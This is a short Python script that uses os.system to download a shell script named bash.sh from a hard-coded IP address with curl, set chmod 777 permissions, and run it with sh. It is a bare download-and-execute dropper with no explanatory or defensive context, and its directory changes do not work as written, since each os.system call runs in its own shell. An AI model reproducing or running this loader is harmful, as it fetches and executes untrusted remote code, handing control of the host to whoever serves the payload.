import os, time
os.system('cd /root/')
os.system('curl -s http://85.204.116.228/bash.sh -o /media/bash.sh')
time.sleep(1)
os.system('chmod 777 *')
os.system('cd /media/')
os.system('sh bash.sh')